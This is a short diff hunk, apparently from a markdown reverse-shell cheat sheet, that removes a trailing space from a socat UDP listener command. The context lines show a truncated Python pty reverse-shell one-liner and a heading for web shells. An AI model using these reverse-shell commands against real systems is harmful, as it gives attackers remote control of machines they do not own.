@@ -187,7 +187,7 @@ import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import
 These shells can't be captured with netcat however, you'll have to use socat
 
 ```bash
-socat file:`tty`,echo=0,raw udp-listen:1234 
+socat file:`tty`,echo=0,raw udp-listen:1234
 ```
 
 ## Web-shells - Platform Independent
